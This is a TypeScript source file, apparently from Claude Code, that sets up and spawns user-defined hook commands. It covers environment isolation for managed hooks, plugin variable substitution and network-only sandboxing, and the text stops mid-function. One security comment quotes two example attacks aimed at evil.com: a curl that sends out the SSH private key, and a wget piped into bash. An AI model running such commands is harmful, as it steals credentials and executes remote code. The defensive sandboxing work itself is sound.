// biome-ignore-all assist/source/organizeImports: ANT-ONLY import markers must not be reordered
/**
 * Hooks are user-defined shell commands that can be executed at various points
 * in Claude Code's lifecycle.
 */
import {
  basename,
  isAbsolute,
  resolve as resolvePath,
  join as joinPath,
} from 'path'
import stripAnsi from 'strip-ansi'
import { stat as statPath } from 'node:fs/promises'
import { getAgentContext, isDelegatedObservation } from './agentContext.js'
import { incrementPluginUsage } from './plugins/pluginUsagePending.js'
import { spawn, type ChildProcessWithoutNullStreams } from 'child_process'
import { pathExists } from './file.js'
import { wrapSpawn } from './ShellCommand.js'
import { TaskOutput } from './task/TaskOutput.js'
import { getCwd } from './cwd.js'
import { randomUUID } from 'crypto'
import { constants as bufferConstants } from 'buffer'
import { getFeatureValueWithSource } from 'src/services/analytics/growthbook.js'
import { formatShellPrefixCommand } from './bash/shellPrefix.js'
import {
  getHookEnvFilePath,
  invalidateSessionEnvCache,
} from './sessionEnvironment.js'
import { subprocessEnv } from './subprocessEnv.js'
import { getPlatform } from './platform.js'
import {
  findGitBashPathOrNull,
  windowsPathToPosixPath,
} from './windowsPaths.js'
import { getCachedPowerShellPath } from './shell/powershellDetection.js'
import { DEFAULT_HOOK_SHELL } from './shell/shellProvider.js'
import { buildPowerShellArgs } from './shell/powershellProvider.js'
import {
  loadPluginOptionsNw,
  substituteUserConfigVariables,
  type PluginOptionValues,
} from './plugins/pluginOptionsStorage.js'
import { getPluginDataDir } from './plugins/pluginDirectories.js'
import {
  getLoadedFunctionHooksModules,
  getPersonalPluginEnvSetKeys,
  getPluginRegisteredCommands,
  hasMatchingFunctionHook,
  runFunctionHookChain,
  setLaterLoadedSessionStart,
  withPersonalPluginEnvIsolated,
  type LoadedFunctionHooksModule,
} from './plugins/functionHooksModules.js'
import {
  getSessionId,
  getProjectRoot,
  getIsNonInteractiveSession,
  getRegisteredHooks,
  getStatsStore,
  addToTurnHookDuration,
  getOriginalCwd,
  getMainThreadAgentType,
  getMainThreadAgentHooks,
  getPromptId,
} from '../bootstrap/state.js'
import { checkHasTrustDialogAccepted } from './config.js'
import {
  getHooksConfigFromSnapshot,
  shouldAllowManagedHooksOnly,
  shouldDisableAllHooksIncludingManaged,
} from './hooks/hooksConfigSnapshot.js'
import {
  getTranscriptPathForSession,
  getAgentTranscriptPath,
} from './sessionPaths.js'
import { asSessionId, type AgentId } from '../types/ids.js'
import {
  getSettings_DEPRECATED,
  getSettingsForSource,
} from './settings/settings.js'
import {
  logEvent,
  type AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
} from 'src/services/analytics/index.js'
import { logOTelEvent } from './telemetry/events.js'
import { ALLOWED_OFFICIAL_MARKETPLACE_NAMES } from './plugins/schemas.js'
import {
  startHookSpan,
  endHookSpan,
  isBetaTracingEnabled,
} from './telemetry/sessionTracing.js'
import { startSessionActivity, stopSessionActivity } from './sessionActivity.js'
import { resolveHookCwd } from './hooks/resolveHookCwd.js'
import {
  getHookStdioError,
  selectCompleteHookOutput,
  stdioFailClosedEvents,
  waitForHookStreams,
} from './hooks/hookStdIO.js'
import { persistHookOutput } from './hooks/persistHookOutput.js'
import {
  hookJSONOutputSchema,
  promptRequestSchema,
  type HookCallback,
  type HookCallbackMatcher,
  type PromptRequest,
  type PromptResponse,
  isAsyncHookJSONOutput,
  isSyncHookJSONOutput,
  type PermissionRequestResult,
} from '../types/hooks.js'
import type {
  HookEvent,
  HookInput,
  HookJSONOutput,
  NotificationHookInput,
  PostToolUseHookInput,
  PostToolUseFailureHookInput,
  PostToolBatchHookInput,
  PermissionDeniedHookInput,
  PreCompactHookInput,
  PostCompactHookInput,
  PreModelSwitchHookInput,
  PostModelSwitchHookInput,
  PreToolUseHookInput,
  SessionStartHookInput,
  SessionEndHookInput,
  SetupHookInput,
  StopHookInput,
  StopFailureHookInput,
  SubagentStartHookInput,
  SubagentStopHookInput,
  TeammateIdleHookInput,
  TaskCreatedHookInput,
  TaskCompletedHookInput,
  ConfigChangeHookInput,
  CwdChangedHookInput,
  FileChangedHookInput,
  DirectoryAddedHookInput,
  InstructionsLoadedHookInput,
  UserPromptSubmitHookInput,
  UserPromptExpansionHookInput,
  PermissionRequestHookInput,
  ElicitationHookInput,
  ElicitationResultHookInput,
  MessageDisplayHookInput,
  PermissionUpdate,
  ExitReason,
  SyncHookJSONOutput,
  AsyncHookJSONOutput,
} from 'src/entrypoints/agentSdkTypes.js'
import type { StatusLineCommandInput } from '../types/statusLine.js'
import type { ElicitResult } from 'src/services/mcp/types.js'
import type { FileSuggestionCommandInput } from '../types/fileSuggestion.js'
import type { HookResultMessage } from 'src/types/message.js'
import chalk from 'chalk'
import type {
  HookMatcher,
  HookCommand,
  PluginHookMatcher,
  SkillHookMatcher,
} from './settings/types.js'
import {
  getHookDisplayText,
  formatHookProgressText,
} from './hooks/hooksSettings.js'
import { trackHookExecution } from './hooks/hookExecutionState.js'
import { formatHookFailureSummaryLine } from './hooks/hookFailureSummary.js'
import { getFeatureValue_CACHED_MAY_BE_STALE } from 'src/services/analytics/growthbook.js'
import { logForDebugging } from './debug.js'
import {
  isEvalConfined,
  stripEvalConfinedHookAllow,
} from './permissions/evalConfined.js'
import { logForDiagnosticsNoPII } from './diagLogs.js'
import { firstLineOf } from './stringUtils.js'
import {
  normalizeLegacyToolName,
  getLegacyToolNames,
  permissionRuleValueFromString,
} from './permissions/permissionRuleParser.js'
import { logError } from './log.js'
import { SandboxManager } from './sandbox/sandbox-adapter.js'
import { AsyncLocalStorage } from 'async_hooks'
import { createCombinedAbortSignal } from './combinedAbortSignal.js'
import type { PermissionResult } from './permissions/PermissionResult.js'
import { registerPendingAsyncHook } from './hooks/AsyncHookRegistry.js'
import { enqueuePendingNotification } from './messageQueueManager.js'
import {
  createSystemMessage,
  createUserMessage,
  extractTextContent,
  getLastAssistantMessage,
  wrapInSystemReminder,
} from './messages.js'
import {
  emitHookStarted,
  emitHookResponse,
  startHookProgressInterval,
} from './hooks/hookEvents.js'
import { createAttachmentMessage } from './attachments.js'
import { noteHookFailure } from './bgNeedsInputBridge.js'
import { all } from './generators.js'
import { findToolByName, type Tools, type ToolUseContext } from '../Tool.js'
import { END_CONVERSATION_TOOL_NAME } from '@claude-code/builtin-tools/tools/EndConversationTool/prompt.js'
import { getPluginHookRunner } from './hooks/pluginHookRunner.js'
import { execPromptHook } from './hooks/execPromptHook.js'
import type {
  AssistantMessage,
  AttachmentMessage,
  Message,
  ProgressMessage,
  SystemMessage,
  UserMessage,
} from '../types/message.js'
import { execAgentHook } from './hooks/execAgentHook.js'
import { execHttpHook } from './hooks/execHttpHook.js'
import { execMcpToolHook } from './hooks/execMcpToolHook.js'
import { ownerOfPluginToolServerKey } from './plugins/pluginToolRegistry.js'
import type { ShellCommand } from './ShellCommand.js'
import {
  getSessionHooks,
  getSessionFunctionHooks,
  getSessionHookCallback,
  clearSessionHooks,
  type SessionDerivedHookMatcher,
  type FunctionHook,
} from './hooks/sessionHooks.js'
import {
  emitTerminalSequence,
  parseAllowedTerminalSequence,
  rejectedTerminalSequenceMessage,
} from './hooks/terminalSequence.js'
import {
  snapshotStopBackgroundTasks,
  snapshotStopSessionCrons,
} from './hooks/stopHookPayload.js'
import { getCurrentSessionTitle } from './sessionStorage.js'
import {
  getProjectTempDir,
  isScratchpadEnabled,
} from './permissions/filesystem.js'
import {
  convertEffortValueToLevel,
  modelSupportsEffort,
  pdSessionEffort,
  resolveHookStdinEffort,
  type EffortLevel,
  type EffortValue,
} from './effort.js'
import {
  matchToolCallManagedPass,
  type ToolCallManagedPass,
} from './hooks/toolCallManagedPass.js'
import type { AppState } from '../state/AppState.js'
import { jsonStringify, jsonParse, slowLogging } from './slowOperations.js'
import { isBareMode, isEnvTruthy } from './envUtils.js'
import {
  ControlStreamClosedError,
  TelemetrySafeError_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
  isAbortError,
  errorMessage,
  getErrnoCode,
} from './errors.js'
import {
  cre,
  Ewe,
  Hye,
  Kle,
  KSn,
  LOe,
  Lsn,
  contextTokensAfterCompact,
  getModelSwitchSession,
  hJ,
  modelSwitchToolUseId,
  nVn,
  Osn,
  yBn,
  yEt,
  type ModelSwitchRequest,
} from './hooks/modelSwitchHooks.js'
import { resolveSessionEndHooksTimeoutMs } from './residualMsEnvGates.js'

const TOOL_HOOK_EXECUTION_TIMEOUT_MS = 10 * 60 * 1000
/** densable `HFe` — UserPromptSubmit per-hook timeout. */
const USER_PROMPT_SUBMIT_HOOK_TIMEOUT_MS = 30_000

import {
  executeInBackground,
  extractCommandScriptPaths,
  isOfficialHookPluginId,
  resetBrokenAsyncRewakeForTests,
} from './hooks/hookAsyncRewake.js'
import {
  isStorageV5ScopeKindHost,
  parsePluginCacheIdentity,
  pluginDirectoryExists,
  type StorageV5ScopeKindHost,
} from './hooks/hookCommandRunner.js'
import { getPinnedStorageV5 } from './storageV5/index.js'
import {
  buildFailClosedHookMatchResult,
  computeSessionEndHooksBoundMs,
  formatHookMatchBlockedMessage,
  getPreToolHookBlockingMessage,
  getSessionEndHookTimeoutMs,
  getSessionEndHooksBoundMs,
  getStopHookMessage,
  getTaskCompletedHookMessage,
  getTaskCreatedHookMessage,
  getTeammateIdleHookMessage,
  getUserPromptExpansionHookBlockingMessage,
  getUserPromptSubmitHookBlockingMessage,
  shouldDowngradeMissingHookScriptExit2,
  shouldFailClosedHookInput,
  shouldSkipHookDueToTrust,
  validateHookInputSize,
} from './hooks/hookInputHelpers.js'
import {
  Eve,
  Swt,
  Uct,
  isSeveralJsonDocuments,
  validateHookJson,
  parseHttpHookOutput,
  wwt,
} from './hooks/hookOutputValidation.js'
import type {
  AggregatedHookResult,
  ElicitationResponse,
  HookBlockingError,
  HookCommandResult,
  HookOutsideReplResult,
  HookResult,
} from './hooks/hookTypes.js'

/**
 * Creates the base hook input that's common to all hook types
 */
export function createBaseHookInput(
  permissionMode?: string,
  sessionId?: string,
  // Typed narrowly (not ToolUseContext) so callers can pass toolUseContext
  // directly via structural typing without this function depending on Tool.ts.
  agentInfo?: {
    agentId?: string
    agentType?: string
    options?: { mainLoopModel?: string }
    getAppState?: () => AppState
    remoteCall?: { origin?: { callerSessionId?: string } }
    permissionLayers?: Array<{ kind: string; effort?: unknown }>
  },
): {
  session_id: string
  transcript_path: string
  cwd: string
  scratchpad_dir?: string
  prompt_id?: string
  permission_mode?: string
  agent_id?: string
  agent_type?: string
  effort?: { level: EffortLevel }
} {
  const resolvedSessionId = sessionId ?? getSessionId()
  // agent_type: subagent's type (from toolUseContext) takes precedence over
  // the session's --agent flag. Hooks use agent_id presence to distinguish
  // subagent calls from main-thread calls in a --agent session.
  const resolvedAgentType = agentInfo?.agentType ?? getMainThreadAgentType()
  const remoteCaller = agentInfo?.remoteCall?.origin?.callerSessionId
  const effortField = resolveBaseHookEffort(agentInfo ?? {})
  if (agentInfo?.remoteCall !== undefined) {
    const servedId =
      remoteCaller && /^[A-Za-z0-9][A-Za-z0-9_.-]{0,255}$/.test(remoteCaller)
        ? remoteCaller
        : 'unknown'
    return {
      session_id: `served:${servedId}`,
      transcript_path: '',
      cwd: getCwd(),
      permission_mode: permissionMode,
      agent_id: agentInfo.agentId,
      ...(effortField !== undefined ? { effort: effortField } : {}),
    }
  }
  const promptId = getPromptId()
  return {
    session_id: resolvedSessionId,
    transcript_path: getTranscriptPathForSession(resolvedSessionId),
    cwd: getCwd(),
    ...resolveScratchpadDirField(resolvedSessionId),
    ...(promptId ? { prompt_id: promptId } : {}),
    permission_mode: permissionMode,
    agent_id: agentInfo?.agentId,
    agent_type: resolvedAgentType,
    ...(effortField !== undefined ? { effort: effortField } : {}),
  }
}

/** densable rd `ck(h, Pd(appState), Ly(permissionLayers))`. */
function resolveBaseHookEffort(agentInfo: {
  options?: { mainLoopModel?: string }
  getAppState?: () => AppState
  permissionLayers?: Array<{ kind: string; effort?: unknown }>
}): { level: EffortLevel } | undefined {
  const model = agentInfo?.options?.mainLoopModel
  if (!model || !agentInfo.getAppState || !modelSupportsEffort(model)) {
    return undefined
  }
  const state = agentInfo.getAppState()
  const pd = pdSessionEffort(state, model)
  let turnEffort: EffortValue | undefined
  for (const layer of agentInfo.permissionLayers ?? []) {
    if (layer?.kind === 'effort') {
      turnEffort = layer.effort as EffortValue
    }
  }
  const applied = resolveHookStdinEffort(model, pd, turnEffort)
  return {
    level: applied === undefined ? 'high' : convertEffortValueToLevel(applied),
  }
}

/** densable QE — join failure is null, omitted from stdin (`?? void 0`). */
function resolveScratchpadDirField(
  sessionId: string,
): { scratchpad_dir: string } | Record<string, never> {
  if (!isScratchpadEnabled()) {
    return {}
  }
  try {
    return {
      scratchpad_dir: joinPath(getProjectTempDir(), sessionId, 'scratchpad'),
    }
  } catch {
    return {}
  }
}

/**
 * densable 2.1.248 kwt @186236662 — Expected schema dumped after Swt.
 */
export function kwt(): string {
  return jsonStringify(
    {
      continue: 'boolean (optional)',
      suppressOutput: 'boolean (optional)',
      stopReason: 'string (optional)',
      decision: '"approve" | "block" (optional)',
      reason: 'string (optional)',
      systemMessage: 'string (optional)',
      terminalSequence: 'string (optional)',
      hookSpecificOutput: {
        'for PreToolUse': {
          hookEventName: '"PreToolUse"',
          permissionDecision: '"allow" | "deny" | "ask" | "defer" (optional)',
          permissionDecisionReason: 'string (optional)',
          updatedInput: 'object (optional) - Modified tool input to use',
        },
        'for PermissionRequest': {
          hookEventName: '"PermissionRequest"',
          decision: {
            'to allow': {
              behavior: '"allow"',
              updatedInput: 'object (optional) - Modified tool input to use',
              updatedPermissions: 'array (optional) - Permission updates',
            },
            'to deny': {
              behavior: '"deny"',
              message: 'string (optional)',
              interrupt: 'boolean (optional)',
            },
          },
        },
        'for UserPromptSubmit': {
          hookEventName: '"UserPromptSubmit"',
          additionalContext: 'string (optional)',
        },
        'for UserPromptExpansion': {
          hookEventName: '"UserPromptExpansion"',
          additionalContext: 'string (optional)',
          suppressOriginalPrompt: 'boolean (optional)',
        },
        'for PostToolUse': {
          hookEventName: '"PostToolUse"',
          additionalContext: 'string (optional)',
        },
        'for PostToolBatch': {
          hookEventName: '"PostToolBatch"',
          additionalContext: 'string (optional)',
        },
        'for Stop / SubagentStop': {
          hookEventName: '"Stop" | "SubagentStop"',
          additionalContext:
            'string (optional) - Feedback for the model; the conversation continues so the model can act on it',
        },
      },
    },
    null,
    2,
  )
}

export function parseHookOutput(stdout: string): {
  json?: HookJSONOutput
  plainText?: string
  validationError?: string
} {
  const trimmed = stdout.trim()
  if (!trimmed.startsWith('{')) {
    logForDebugging('Hook output does not start with {, treating as plain text')
    return { plainText: stdout }
  }

  try {
    const result = validateHookJson(trimmed)
    if ('json' in result) {
      return result
    }
    // densable 2.1.248 lIe: Swt + Expected schema from kwt()
    const errorMessage = `${result.validationError}\n\nExpected schema:\n${kwt()}`
    logForDebugging(errorMessage)
    return { plainText: stdout, validationError: errorMessage }
  } catch (e) {
    if (!trimmed.endsWith('}')) {
      logForDebugging(
        `Hook output starts with { but is not a JSON object, treating as plain text: ${errorMessage(e)}`,
      )
      return { plainText: stdout }
    }
    if (isSeveralJsonDocuments(trimmed)) {
      logForDebugging(
        'Hook output is several JSON documents, treating as plain text',
      )
      return { plainText: stdout }
    }
    const validationError = `Hook output looks like a JSON object but is not valid JSON — ${errorMessage(e)}. Emit the payload with a JSON encoder (jq, ConvertTo-Json, json.dumps) rather than string concatenation so backslashes and quotes inside strings are escaped.`
    logForDebugging(validationError)
    return { plainText: stdout, validationError }
  }
}

/**
 * Gold #542 — format `--debug` completion log for command hooks on tool calls,
 * prompts, SessionStart, and Stop (command, plugin, outcome, durationMs).
 */
export function formatHookCompletionDebugLog({
  hookName,
  command,
  pluginId,
  result,
  timeoutMs,
  durationMs,
  parentAborted,
}: {
  hookName: string
  command: string
  pluginId?: string
  result: Pick<
    HookCommandResult,
    'aborted' | 'backgrounded' | 'spawnFailed' | 'status'
  >
  timeoutMs: number
  durationMs: number
  parentAborted: boolean
}): string {
  const outcome = result.aborted
    ? parentAborted
      ? 'cancelled'
      : `timed out after ${timeoutMs}ms`
    : result.backgrounded
      ? 'moved to the background'
      : result.spawnFailed
        ? 'failed to start'
        : `finished with status ${result.status}`
  return `Hooks: ${hookName} [${command}]${pluginId ? ` (plugin ${pluginId})` : ''} ${outcome} (${durationMs}ms)`
}

function isManagedCommandHook(
  hook: HookCommand & { type: 'command' },
  hookEvent: HookEvent | 'StatusLine' | 'FileSuggestion',
  pluginRoot?: string,
  skillRoot?: string,
): boolean {
  if (pluginRoot !== undefined || skillRoot !== undefined) {
    return false
  }
  if (hookEvent === 'StatusLine' || hookEvent === 'FileSuggestion') {
    const policy = getSettingsForSource('policySettings')
    const entry =
      hookEvent === 'StatusLine' ? policy?.statusLine : policy?.fileSuggestion
    return entry?.type === 'command' && entry.command === hook.command
  }
  const matchers = getSettingsForSource('policySettings')?.hooks?.[hookEvent]
  if (!matchers) return false
  return matchers.some(m =>
    m.hooks.some(h => h.type === 'command' && h.command === hook.command),
  )
}

/**
 * #696 (SEA `dX` / `F2e` / `lEn`): When a command hook comes from managed
 * settings (`policySettings`), strip repository (`projectSettings` /
 * `localSettings`) env vars that are not also set by `policySettings` or
 * `userSettings` so project env cannot hijack `CLAUDE_CODE_SHELL_PREFIX` or
 * managed hook execution environment.
 */
export function buildManagedHookIsolatedEnv(baseEnv: NodeJS.ProcessEnv): {
  env: NodeJS.ProcessEnv
  strippedKeys: string[]
} {
  const policyEnv = getSettingsForSource('policySettings')?.env ?? {}
  const userEnv = getSettingsForSource('userSettings')?.env ?? {}
  const projectEnv = getSettingsForSource('projectSettings')?.env ?? {}
  const localEnv = getSettingsForSource('localSettings')?.env ?? {}

  const strippedKeys: string[] = []
  const env: NodeJS.ProcessEnv = { ...baseEnv }
  for (const key of new Set([
    ...Object.keys(projectEnv),
    ...Object.keys(localEnv),
  ])) {
    if (
      !Object.hasOwn(policyEnv, key) &&
      !Object.hasOwn(userEnv, key) &&
      Object.hasOwn(env, key)
    ) {
      delete env[key]
      strippedKeys.push(key)
    }
  }
  return { env, strippedKeys }
}

export async function execCommandHook(
  hook: HookCommand & { type: 'command' },
  hookEvent: HookEvent | 'StatusLine' | 'FileSuggestion',
  hookName: string,
  jsonInput: string,
  signal: AbortSignal,
  hookId: string,
  hookIndex?: number,
  pluginRoot?: string,
  pluginId?: string,
  skillRoot?: string,
  forceSyncExecution?: boolean,
  requestPrompt?: (request: PromptRequest) => Promise<PromptResponse>,
  storageV5?: unknown,
  credentials?: unknown,
): Promise<HookCommandResult> {
  // Gated to once-per-session events to keep diag_log volume bounded.
  // started/completed live inside the try/finally so setup-path throws
  // don't orphan a started marker — that'd be indistinguishable from a hang.
  const shouldEmitDiag =
    hookEvent === 'SessionStart' ||
    hookEvent === 'Setup' ||
    hookEvent === 'SessionEnd'
  const diagStartMs = Date.now()
  let diagExitCode: number | undefined
  let diagAborted = false

  const isWindows = getPlatform() === 'windows'

  // --
  // Per-hook shell selection (phase 1 of docs/design/ps-shell-selection.md).
  // Resolution order: hook.shell → DEFAULT_HOOK_SHELL. The defaultShell
  // fallback (settings.defaultShell) is phase 2 — not wired yet.
  //
  // The bash path is the historical default and stays unchanged. The
  // PowerShell path deliberately skips the Windows-specific bash
  // accommodations (cygpath conversion, .sh auto-prepend, POSIX-quoted
  // SHELL_PREFIX).
  const shellType =
    hook.shell ??
    (isWindows && findGitBashPathOrNull() === null
      ? 'powershell'
      : DEFAULT_HOOK_SHELL)

  const isPowerShell = shellType === 'powershell'

  // --
  // Windows bash path: hooks run via Git Bash (Cygwin), NOT cmd.exe.
  //
  // This means every path we put into env vars or substitute into the command
  // string MUST be a POSIX path (/c/Users/foo), not a Windows path
  // (C:\Users\foo or C:/Users/foo). Git Bash cannot resolve Windows paths.
  //
  // windowsPathToPosixPath() is pure-JS regex conversion (no cygpath shell-out):
  // C:\Users\foo -> /c/Users/foo, UNC preserved, slashes flipped. Memoized
  // (LRU-500) so repeated calls are cheap.
  //
  // PowerShell path: use native paths — skip the conversion entirely.
  // PowerShell expects Windows paths on Windows (and native paths on
  // Unix where pwsh is also available).
  const toHookPath =
    isWindows && !isPowerShell
      ? (p: string) => windowsPathToPosixPath(p)
      : (p: string) => p

  // Set CLAUDE_PROJECT_DIR to the stable project root (not the worktree path).
  // getProjectRoot() is never updated when entering a worktree, so hooks that
  // reference $CLAUDE_PROJECT_DIR always resolve relative to the real repo root.
  const projectDir = getProjectRoot()

  // Substitute ${CLAUDE_PLUGIN_ROOT} and ${user_config.X} in the command string.
  // Order matches MCP/LSP (plugin vars FIRST, then user config) so a user-
  // entered value containing the literal text ${CLAUDE_PLUGIN_ROOT} is treated
  // as opaque — not re-interpreted as a template.
  //
  // Official 2.1.207: shell-form hooks (no `args`) must not embed ${user_config.*}
  // — the substituted value would be re-parsed by the shell (injection). Use
  // exec form `{ "command": "<exe>", "args": ["${user_config.KEY}", ...] }` or
  // read $CLAUDE_PLUGIN_OPTION_<KEY> from the environment instead.
  const USER_CONFIG_REF = /\$\{user_config\.[^}]+\}/
  const isExecForm = Array.isArray(hook.args)
  let command = hook.command
  let execArgs: string[] | undefined = isExecForm
    ? [...(hook.args as string[])]
    : undefined
  let pluginOpts: PluginOptionValues | undefined
  // Reject before any substitution so shell form never interpolates secrets.
  if (!isExecForm && USER_CONFIG_REF.test(hook.command)) {
    const from = pluginId ? `plugin ${pluginId}` : 'plugin'
    throw new Error(
      `Hook from ${from} references \${user_config.*} in a shell-form command. ` +
        `The substituted value would be re-parsed by the shell. Use exec form instead ` +
        `{"command": "<executable>", "args": ["\${user_config.KEY}", ...]} ` +
        `or read $CLAUDE_PLUGIN_OPTION_<KEY> from the hook's environment. ` +
        `Command: ${hook.command}`,
    )
  }
  if (pluginRoot) {
    // Plugin directory gone (orphan GC race, concurrent session deleted it):
    // throw so callers yield a non-blocking error. Running would fail — and
    // `python3 <missing>.py` exits 2, the hook protocol's "block" code, which
    // bricks UserPromptSubmit/Stop until restart. The pre-check is necessary
    // because exit-2-from-missing-script is indistinguishable from an
    // intentional block after spawn.
    if (!(await pluginDirectoryExists(storageV5, pluginRoot))) {
      throw new Error(
        `Plugin directory does not exist: ${pluginRoot}` +
          (pluginId ? ` (${pluginId} — run /plugin to reinstall)` : ''),
      )
    }
    // Inline both ROOT and DATA substitution instead of calling
    // substitutePluginVariables(). That helper normalizes \ → / on Windows
    // unconditionally — correct for bash (toHookPath already produced /c/...
    // so it's a no-op) but wrong for PS where toHookPath is identity and we
    // want native C:\... backslashes. Inlining also lets us use the function-
    // form .replace() so paths containing $ aren't mangled by $-pattern
    // interpretation (rare but possible: \\server\c$\plugin).
    const rootPath = toHookPath(pluginRoot)
    const subPluginVars = (s: string): string => {
      let out = s.replace(/\$\{CLAUDE_PLUGIN_ROOT\}/g, () => rootPath)
      if (pluginId) {
        const dataPath = toHookPath(getPluginDataDir(pluginId))
        out = out.replace(/\$\{CLAUDE_PLUGIN_DATA\}/g, () => dataPath)
      }
      return out
    }
    command = subPluginVars(command)
    if (execArgs) {
      execArgs = execArgs.map(subPluginVars)
    }
    if (pluginId) {
      pluginOpts = await loadPluginOptionsNw(pluginId, credentials)
      // Throws if a referenced key is missing — that means the hook uses a key
      // that's either not declared in manifest.userConfig or not yet configured.
      // Caught upstream like any other hook exec failure.
      // Exec form only: substitute into command + each arg as plain strings.
      if (isExecForm) {
        command = substituteUserConfigVariables(command, pluginOpts)
        execArgs = (execArgs ?? []).map(a =>
          substituteUserConfigVariables(a, pluginOpts!),
        )
      }
      // Shell form: user_config already rejected above; still allow env-only access.
    }
  }

  // On Windows (bash only), auto-prepend `bash` for .sh scripts so they
  // execute instead of opening in the default file handler. PowerShell
  // runs .ps1 files natively — no prepend needed.
  if (isWindows && !isPowerShell && command.trim().match(/\.sh(\s|$|")/)) {
    if (!command.trim().startsWith('bash ')) {
      command = `bash ${command}`
    }
  }

  const isManaged = isManagedCommandHook(hook, hookEvent, pluginRoot, skillRoot)
  const isolated = isManaged
    ? withPersonalPluginEnvIsolated(() =>
        buildManagedHookIsolatedEnv(subprocessEnv()),
      )
    : null
  const personalPluginEnvKeys = isManaged ? getPersonalPluginEnvSetKeys() : []
  if (personalPluginEnvKeys.length > 0) {
    logForDebugging(
      `Hooks: ${hookName} is the organization's and starts without a person's plugin's $.env.set of ${personalPluginEnvKeys.join(', ')}`,
    )
  }
  if (isolated && isolated.strippedKeys.length > 0) {
    logForDebugging(
      `Hooks: ${hookName} is the organization's and starts without the repository settings' env of ${isolated.strippedKeys.join(', ')}`,
    )
  }

  // Official SHELL_PREFIX densable wraps the command via POSIX quoting
  // (formatShellPrefixCommand uses shell-quote). This makes no sense for
  // PowerShell — see design §8.1. For now PS hooks ignore the prefix;
  // a CLAUDE_CODE_PS_SHELL_PREFIX (or shell-aware prefix) is a follow-up.
  const baseEnvForHook = isolated ? isolated.env : subprocessEnv()
  let shellPrefix: string | null =
    baseEnvForHook.CLAUDE_CODE_SHELL_PREFIX || null
  try {
    const { resolveShellPrefix } =
      // eslint-disable-next-line @typescript-eslint/no-require-imports
      require('./residualFinalEnvGates.js') as typeof import('./residualFinalEnvGates.js')
    shellPrefix = resolveShellPrefix(baseEnvForHook)
  } catch {
    // keep raw env fallback
  }
  const finalCommand =
    !isPowerShell && shellPrefix
      ? formatShellPrefixCommand(shellPrefix, command)
      : command

  const hookTimeoutMs = hook.timeout
    ? hook.timeout * 1000
    : TOOL_HOOK_EXECUTION_TIMEOUT_MS

  // Build env vars — all paths go through toHookPath for Windows POSIX conversion
  const envVars: NodeJS.ProcessEnv = {
    ...baseEnvForHook,
    CLAUDE_PROJECT_DIR: toHookPath(projectDir),
  }

  // Plugin and skill hooks both set CLAUDE_PLUGIN_ROOT (skills use the same
  // name for consistency — skills can migrate to plugins without code changes)
  if (pluginRoot) {
    envVars.CLAUDE_PLUGIN_ROOT = toHookPath(pluginRoot)
    if (pluginId) {
      envVars.CLAUDE_PLUGIN_DATA = toHookPath(getPluginDataDir(pluginId))
    }
  }
  // Expose plugin options as env vars too, so hooks can read them without
  // ${user_config.X} in the command string. Sensitive values included — hooks
  // run the user's own code, same trust boundary as reading keychain directly.
  if (pluginOpts) {
    for (const [key, value] of Object.entries(pluginOpts)) {
      // Sanitize non-identifier chars (bash can't ref $FOO-BAR). The schema
      // at schemas.ts:611 now constrains keys to /^[A-Za-z_]\w*$/ so this is
      // belt-and-suspenders, but cheap insurance if someone bypasses the schema.
      const envKey = key.replace(/[^A-Za-z0-9_]/g, '_').toUpperCase()
      envVars[`CLAUDE_PLUGIN_OPTION_${envKey}`] = String(value)
    }
  }
  if (skillRoot) {
    envVars.CLAUDE_PLUGIN_ROOT = toHookPath(skillRoot)
  }

  // CLAUDE_ENV_FILE points to a .sh file that the hook writes env var
  // definitions into; getSessionEnvironmentScript() concatenates them and
  // bashProvider injects the content into bash commands. A PS hook would
  // naturally write PS syntax ($env:FOO = 'bar'), which bash can't parse.
  // Skip for PS — consistent with how .sh prepend and SHELL_PREFIX are
  // already bash-only above.
  if (
    !isPowerShell &&
    (hookEvent === 'SessionStart' ||
      hookEvent === 'Setup' ||
      hookEvent === 'CwdChanged' ||
      hookEvent === 'FileChanged') &&
    hookIndex !== undefined
  ) {
    envVars.CLAUDE_ENV_FILE = await getHookEnvFilePath(hookEvent, hookIndex)
  }

  // Official ies: deleted cwd → originalCwd → projectRoot → homedir → tmpdir.
  // spawn() emits async 'error' for missing cwd rather than throwing.
  const hookCwd = getCwd()
  const safeCwd = await resolveHookCwd(hookCwd, {
    originalCwd: getOriginalCwd(),
    projectRoot: getProjectRoot(),
  })

  // --
  // Spawn. Three paths:
  //
  //   Exec form (hook.args present): spawn(command, args) — no shell.
  //   Official 2.1.207; safe for ${user_config.*} substitution.
  //
  //   Bash shell form: spawn(cmd, [], { shell: <gitBashPath | true> }) —
  //   the shell option makes Node pass the whole string to the shell.
  //
  //   PowerShell shell form: spawn(pwshPath, ['-NoProfile', '-NonInteractive',
  //   '-Command', cmd]) — explicit argv, no shell option.
  //
  // The Git Bash hard-exit in findGitBashPath() is still in place for
  // bash hooks. PowerShell hooks never call it, so a Windows user with
  // only pwsh and shell: 'powershell' on every hook could in theory run
  // without Git Bash — but init.ts still calls setShellIfWindows() on
  // startup, which will exit first. Relaxing that is phase 1 of the
  // design's implementation order (separate PR).

  // SECURITY: Apply network-only sandbox to shell-form hook commands when
  // sandboxing is enabled. Exec form skips shell sandbox wrapping (argv is
  // not re-parsed by a shell).
  // Hooks execute arbitrary shell commands from settings.json without going
  // through the Bash tool's permission prompt. Unlike the full Bash sandbox,
  // hooks only get network restrictions (not filesystem restrictions) because:
  //   - Legitimate hooks (formatters, linters, type checkers) need full
  //     filesystem access to read/write project files
  //   - The core threat from malicious hooks is data exfiltration (e.g.
  //     `curl http://evil.com?key=$(cat ~/.ssh/id_rsa)`) and payload download
  //     (e.g. `wget http://evil.com/malware.sh | bash`)
  //   - Hooks that genuinely need network (notifications) should use the
  //     `http` hook type, which is not affected by this sandbox
  let sandboxedCommand = finalCommand
  if (!isExecForm && !isPowerShell && SandboxManager.isSandboxingEnabled()) {
    try {
      sandboxedCommand = await SandboxManager.wrapWithSandbox(
        finalCommand,
        undefined, // use default shell
        {
          // Network: deny all outbound by default. Hooks that need network
          // should use the `http` hook type instead of shell commands.
          network: {
            allowedDomains: [],
            deniedDomains: [],
          },
          // Filesystem: no additional restrictions beyond sandbox defaults.
          // Hooks need to read/write project files freely (e.g. prettier --write).
          filesystem: {
            allowWrite: ['/'],
            denyWrite: [],
            allowRead: [],
            denyRead: [],
          },
        },
        signal,
      )
      logForDebugging(
        `Hook command sandboxed (network-only): ${hook.command}`,
